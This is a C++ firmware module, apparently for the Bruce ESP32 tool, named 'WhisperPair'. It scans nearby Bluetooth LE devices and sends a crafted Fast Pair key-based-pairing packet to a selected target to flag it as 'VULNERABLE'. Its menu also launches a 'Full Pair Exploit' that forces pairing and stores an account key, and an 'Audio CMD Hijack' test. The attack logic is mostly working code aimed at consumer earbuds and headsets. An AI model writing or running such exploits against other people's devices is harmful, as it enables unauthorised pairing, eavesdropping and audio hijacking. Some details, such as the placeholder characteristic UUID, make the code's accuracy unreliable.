#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "whisperpair_debug.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

void updateScanDisplay(uint32_t foundCount, uint32_t elapsedMs, bool forceRedraw) {
    static uint32_t lastFound = 0;
    static uint32_t lastTime = 0;
    static uint32_t lastUpdate = 0;
    uint32_t now = millis();
    if(!forceRedraw && (now - lastUpdate < 250)) return;
    lastUpdate = now;
    if(forceRedraw || foundCount != lastFound) {
        tft.fillRect(20, 60, 100, 20, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Found: " + String(foundCount));
        lastFound = foundCount;
    }
    uint32_t elapsedSeconds = elapsedMs / 1000;
    if(forceRedraw || elapsedSeconds != lastTime) {
        tft.fillRect(20, 80, 100, 20, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        tft.print("Time: " + String(elapsedSeconds) + "s");
        lastTime = elapsedSeconds;
    }
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    padprintln(message);
    padprintln("");
    padprintln("Press SEL to confirm");
    padprintln("or ESC to cancel");
    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(500);
            return false;
        }
        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);
    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

String selectTargetFromScan(const char* title) {
    struct BLE_Device {
        std::string address;
        std::string name;
        int rssi;
    };
    std::vector<BLE_Device> foundDevices;
    bool scanning = false;
    foundDevices.clear();
    
    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->clearResults();
    
    class SimpleScanCallbacks : public NimBLEScanCallbacks {
        std::vector<BLE_Device>& devices;
        bool& scanningRef;
    public:
        SimpleScanCallbacks(std::vector<BLE_Device>& devs, bool& scanningFlag) 
            : devices(devs), scanningRef(scanningFlag) {}
        
        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
            if(!advertisedDevice) return;
            BLE_Device device;
            device.address = advertisedDevice->getAddress().toString();
            device.name = advertisedDevice->getName();
            device.rssi = advertisedDevice->getRSSI();
            if(device.name.empty()) device.name = "Unknown";
            if(device.rssi < -95) return;
            bool exists = false;
            for(auto& dev : devices) {
                if(dev.address == device.address) {
                    exists = true;
                    dev.rssi = device.rssi;
                    break;
                }
            }
            if(!exists) devices.push_back(device);
        }
        void onScanEnd(NimBLEScanResults results) {
            scanningRef = false;
        }
    };
    
    SimpleScanCallbacks* callbacks = new SimpleScanCallbacks(foundDevices, scanning);
    pScan->setScanCallbacks(callbacks);
    pScan->setActiveScan(true);
    pScan->setInterval(160);
    pScan->setWindow(80);
    pScan->setMaxResults(0);
    pScan->setDuplicateFilter(true);
    
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Found: 0");
    tft.setCursor(20, 80);
    tft.print("Time: 0s");
    tft.setCursor(20, 100);
    tft.print("Press ESC to stop");
    tft.fillRect(20, 140, tftWidth - 40, 10, TFT_DARKGREY);
    
    scanning = true;
    uint32_t scanStartTime = millis();
    
    if(!pScan->start(0, false)) {
        delete callbacks;
        displayMessage("Scan Failed", "OK", "", "", TFT_RED);
        return "";
    }
    
    static int barPos = 0;
    uint32_t lastUpdate = 0;
    
    while(scanning) {
        uint32_t now = millis();
        if(now - lastUpdate > 250) {
            lastUpdate = now;
            updateScanDisplay(foundDevices.size(), now - scanStartTime);
            int barWidth = tftWidth - 40;
            tft.fillRect(20, 140, barWidth, 10, TFT_DARKGREY);
            barPos = (barPos + 5) % (barWidth - 20);
            tft.fillRect(20 + barPos, 140, 20, 10, TFT_GREEN);
        }
        if(check(EscPress)) {
            pScan->stop();
            scanning = false;
            break;
        }
        delay(10);
    }
    
    delete callbacks;
    
    if(foundDevices.empty()) {
        displayMessage("NO DEVICES", "Found 0 devices", "", "", TFT_YELLOW);
        delay(1500);
        return "";
    }
    
    int currentIndex = 0;
    bool redraw = true;
    String selectedMAC = "";
    
    while(selectedMAC.isEmpty()) {
        if(check(EscPress)) break;
        if(redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SELECT DEVICE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            padprintln("Found: " + String(foundDevices.size()));
            padprintln("Device " + String(currentIndex + 1) + "/" + String(foundDevices.size()));
            padprintln("");
            if(currentIndex < foundDevices.size()) {
                BLE_Device& dev = foundDevices[currentIndex];
                padprintln("Name: " + String(dev.name.c_str()));
                padprintln("MAC: " + String(dev.address.c_str()));
                padprintln("RSSI: " + String(dev.rssi) + " dBm");
            }
            padprintln("");
            padprintln("PREV/NEXT: Navigate");
            padprintln("SEL: Select device");
            padprintln("ESC: Cancel");
            redraw = false;
        }
        delay(50);
        if(check(PrevPress)) {
            if(currentIndex > 0) {
                currentIndex--;
                redraw = true;
            }
        } else if(check(NextPress)) {
            if(currentIndex < foundDevices.size() - 1) {
                currentIndex++;
                redraw = true;
            }
        } else if(check(SelPress)) {
            if(currentIndex < foundDevices.size()) {
                selectedMAC = String(foundDevices[currentIndex].address.c_str());
            }
        }
    }
    
    return selectedMAC;
}

void testFastPairVulnerability() {
    String selectedMAC = selectTargetFromScan("SELECT TARGET");
    if(selectedMAC.isEmpty()) return;
    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
    if(!requireSimpleConfirmation("Test vulnerability?")) return;
    bool vulnerable = attemptKeyBasedPairing(target);
    Serial.printf("[WhisperPair] %s - %s\n", 
        selectedMAC.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );
    delay(2000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;
    
    options.push_back({"[🔍] Scan & Test", []() {
        testFastPairVulnerability();
    }});
    
    options.push_back({"[⚡] Full Pair Test", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        padprintln("This will attempt full pairing:");
        padprintln("1. Connect to target");
        padprintln("2. ECDH key exchange");
        padprintln("3. Complete pairing");
        padprintln("4. Store account key");
        padprintln("");
        padprintln("Press SEL to continue");
        padprintln("ESC to cancel");
        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }
        String selectedMAC = selectTargetFromScan("SELECT TARGET");
        if(selectedMAC.isEmpty()) return;
        NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;
        bool success = whisperPairFullExploit(target);
        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            displayMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});
    
    options.push_back({"[🎤] Audio CMD Hijack", []() {
        audioCommandHijackTest();
    }});
    
    options.push_back({"[🐛] Debug Menu", []() {
        whisperPairDebugMenu();
    }});
    
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}